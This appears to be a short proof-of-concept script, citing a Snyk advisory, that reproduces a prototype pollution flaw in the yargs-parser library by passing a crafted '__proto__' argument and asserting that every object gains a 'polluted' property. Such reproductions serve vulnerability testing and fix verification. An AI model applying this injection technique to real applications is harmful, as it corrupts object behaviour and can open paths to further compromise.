//https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381

const parser = require("yargs-parser");
const assert = require('assert');

var x = {}
console.log(({}).bar);
parser('--foo.__proto__.polluted yes');

console.log(({}).polluted);
assert({}.polluted === "yes");
console.log("Payload success!");

